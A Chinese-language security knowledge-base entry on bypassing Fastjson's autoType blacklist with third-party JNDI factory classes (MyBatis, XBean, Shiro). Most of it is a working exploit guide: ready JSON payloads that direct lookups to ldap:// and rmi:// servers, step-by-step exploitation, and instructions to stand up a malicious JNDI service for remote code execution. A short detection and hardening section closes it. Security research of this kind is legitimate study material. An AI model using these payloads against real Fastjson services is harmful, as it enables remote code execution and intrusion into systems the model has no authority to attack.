---
id: web-java-deser-fastjson-thirdparty-jndi-factory-blacklist-gap
title: Fastjson 黑名单覆盖不到的第三方 JNDI 工厂：MyBatis JndiDataSourceFactory / XBean JndiConverter / Shiro JndiObjectFactory
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-thirdparty-jndi-factory-blacklist-gap
aliases:
- MyBatis JndiDataSourceFactory
- org.apache.xbean.propertyeditor.JndiConverter
- org.apache.shiro.jndi.JndiObjectFactory
- Fastjson 1.2.45 黑名单绕过
- Fastjson <=1.2.62
- Fastjson <=1.2.66
- 第三方 JNDI 工厂
tags:
- java
- fastjson
- deserialization
- autotype
- blacklist-bypass
- jndi
- mybatis
- xbean
- shiro
cve: []
severity: high
confidence: high
affected_versions: fastjson <=1.2.45（MyBatis）、<=1.2.62（XBean）、<=1.2.66（Shiro）（原文标记）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V306
  verified_at: '2026-11-08T11:37:20+08:00'
  notes: 已对照原文核对：MyBatis JndiDataSourceFactory.setProperties 的 lookup 截图与正文一致；XBean JndiConverter、Shiro JndiObjectFactory 仅有原文文字与 PoC、无截图，未在本机复跑；affected_versions 原文标记一致
---

## 一句话结论

Fastjson 的 `denyList` 是前缀枚举，只能覆盖已知危险包，无法穷尽第三方库里的 JNDI 工厂：`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory` 的 `setProperties` 会把 `data_source` 交给 `InitialContext.lookup`（fastjson 1.2.45，需 autoTypeSupport=true、mybatis 3.x–3.5.0），`org.apache.xbean.propertyeditor.JndiConverter` 的 `AsText` setter 会 lookup（<=1.2.62），`org.apache.shiro.jndi.JndiObjectFactory` 的 `resourceName` 会 lookup（<=1.2.66）；这些类名不在黑名单里，因此可绕过过滤触发 JNDI 注入。

## 原理

- **黑名单机制**：`ParserConfig.denyList` 是一组包/类前缀（`bsh`、`com.mchange`、`com.sun.`、`java.lang.Thread`、`java.net.Socket`、`java.rmi`、`javax.xml`、`org.apache.bcel`、`org.apache.commons.beanutils`、`org.apache.commons.collections.Transformer` 等），`checkAutoType` 用 `className.startsWith(deny)` 匹配；只要恶意类不在列表前缀内，就能通过。
- **MyBatis JndiDataSourceFactory（1.2.45）**：`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory.setProperties(Properties properties)` 中，若 properties 含 `INITIAL_CONTEXT`/`DATA_SOURCE`，会执行 `initCtx.lookup(properties.getProperty(DATA_SOURCE))` 并把结果强转为 `DataSource`；`data_source` 的值完全可控。利用条件：目标有 mybatis 3.x–3.5.0 的 jar、fastjson 1.2.45、`autoTypeSupport=true`（1.2.25+ 默认 false）。
- **XBean JndiConverter（<=1.2.62）**：`org.apache.xbean.propertyeditor.JndiConverter` 继承 `PropertyEditorSupport`，`setAsText(String text)` 会用 `InitialContext.lookup(text)` 解析 JNDI；Fastjson 反序列化会调用 `AsText` setter，payload 为 `{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://..."}`。该版本黑名单未覆盖 `org.apache.xbean...`。
- **Shiro JndiObjectFactory（<=1.2.66）**：`org.apache.shiro.jndi.JndiObjectFactory` 的 `setResourceName` 会把 `resourceName` 交给 JNDI lookup（通过 `JndiTemplate`/`InitialContext`）；payload 为 `{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://..."}`。该版本黑名单未覆盖 `org.apache.shiro...`。
- **共同点**：黑名单只能“列举已知坏类”，而第三方库中存在大量“setter/getter 内做 JNDI lookup/远程加载”的类；只要目标 classpath 有对应 jar，就能用合法类名通过白名单/黑名单检查，最终落到 JNDI 的远程 Reference/序列化链。
- **为什么能成功**：Fastjson 的 AutoType 允许按 `@type` 实例化并调用 setter；黑名单是安全边界但非完备；JNDI 的 `lookup` 又会从远程加载对象/工厂，形成二次利用面。

## 触发条件

- 目标使用对应版本的 Fastjson（MyBatis 场景 1.2.45；XBean <=1.2.62；Shiro <=1.2.66），且 autoType 可用（MyBatis 场景需 `autoTypeSupport=true`；XBean/Shiro 视版本/配置）。
- 目标 classpath 存在对应第三方 jar：mybatis 3.x–3.5.0、xbean-propertyeditor、shiro-core（版本需匹配）。
- 攻击者能控制 JSON 请求体的 `@type` 与属性（`properties.data_source` / `AsText` / `resourceName`）。
- 目标可访问攻击者控制的 LDAP/RMI/JNDI 服务，且 JDK 未完全禁用远程 codebase/Reference（高版本 JDK 需配合本地 gadget 或反序列化链）。
- 目标未开启 safeMode/白名单严格模式。

## 利用步骤

1. 探测 Fastjson 版本与 autoType 状态（见 `[[web-java-deser-fastjson-recon-version-dependency-probe]]`），并探测依赖（报错/类加载差异）。
2. MyBatis 场景（1.2.45）：
   ```json
   {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties":{"data_source":"ldap://127.0.0.1:1234/Exploit"}}
   ```
   确认 mybatis 版本在 3.x–3.5.0，且 autoTypeSupport=true。
3. XBean 场景（<=1.2.62）：
   ```json
   {"@type":"org.apache.xbean.propertyeditor.JndiConverter",
    "AsText":"rmi://127.0.0.1:1099/exploit"}
   ```
4. Shiro 场景（<=1.2.66）：
   ```json
   {"@type":"org.apache.shiro.jndi.JndiObjectFactory",
    "resourceName":"ldap://192.168.80.1:1389/Calc"}
   ```
5. 搭建 JNDI 服务（LDAP/RMI）返回恶意 Reference/序列化数据；结合目标 JDK 版本选择本地 gadget 或远程 codebase 绕过。
6. 观察命令执行/回连；记录生效的类名与版本区间，作为目标指纹。

## PoC

```json
// MyBatis JndiDataSourceFactory（fastjson 1.2.45）
{
  "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
  "properties": {
    "data_source": "ldap://127.0.0.1:1234/Exploit"
  }
}

// XBean JndiConverter（fastjson <= 1.2.62）
{
  "@type": "org.apache.xbean.propertyeditor.JndiConverter",
  "AsText": "rmi://127.0.0.1:1099/exploit"
}

// Shiro JndiObjectFactory（fastjson <= 1.2.66）
{
  "@type": "org.apache.shiro.jndi.JndiObjectFactory",
  "resourceName": "ldap://192.168.80.1:1389/Calc"
}
```

```java
// MyBatis JndiDataSourceFactory.setProperties 关键逻辑（原文截图）
if (properties.containsKey(INITIAL_CONTEXT) && properties.containsKey(DATA_SOURCE)) {
    Context ctx = (Context) initCtx.lookup(properties.getProperty(INITIAL_CONTEXT));
    dataSource = (DataSource) ctx.lookup(properties.getProperty(DATA_SOURCE));
} else if (properties.containsKey(DATA_SOURCE)) {
    dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE));
}
```

## 变体与关联

- 变体：任何“setter/getter 中调用 `InitialContext.lookup`/`JndiTemplate.lookup`/`Context.lookup`”的第三方类都可作为候选；可按 classpath 中的 jar 枚举（如 c3p0、DBCP、Shiro、XBean、MyBatis 等）。
- 变体：JNDI 高版本 JDK 限制远程 codebase 时，可改返回本地 `Reference` + 工厂类、序列化 gadget（如 CommonsCollections）、或 `org.apache.naming.factory.BeanFactory` + EL 等本地链。
- 关联：`[[web-java-deser-fastjson-jdbc-rowset]]`（JdbcRowSetImpl 的 JNDI 链）、`[[web-java-deser-fastjson-c3p0-jndiref-jndi]]`（c3p0 JndiRef）、`[[web-java-deser-fastjson-1247-class-cache-bypass]]`（Class 缓存把任意类写入 mappings 后再用 `@type`）。
- 边界：MyBatis 1.2.45 场景需要 autoTypeSupport=true；XBean/Shiro 需对应 jar 与版本；JDK 高版本/安全策略可能拦截远程 JNDI；文章 PoC 为演示性，未在本机复跑。

## 检测与防御

- 检测：`@type` 出现 `org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`、`org.apache.xbean.propertyeditor.JndiConverter`、`org.apache.shiro.jndi.JndiObjectFactory` 等第三方 JNDI 工厂类名；JSON 中出现 `data_source`、`AsText`、`resourceName` 指向 `ldap://`/`rmi://`。
- 修复：升级 Fastjson 到安全版本并关闭 autoType；开启 safeMode；使用白名单而不是黑名单。
- 加固：classpath 最小化，移除不必要的第三方 JNDI 工厂类；JNDI 禁用远程 codebase/Reference；JDK 升级到限制 LDAP 远程加载的版本；WAF 对 `@type` 做类名归一化+黑名单。
- 监控：对 JNDI/LDAP/RMI 外联、`InitialContext.lookup`、可疑 `@type` 类加载与 Fastjson 异常做告警。
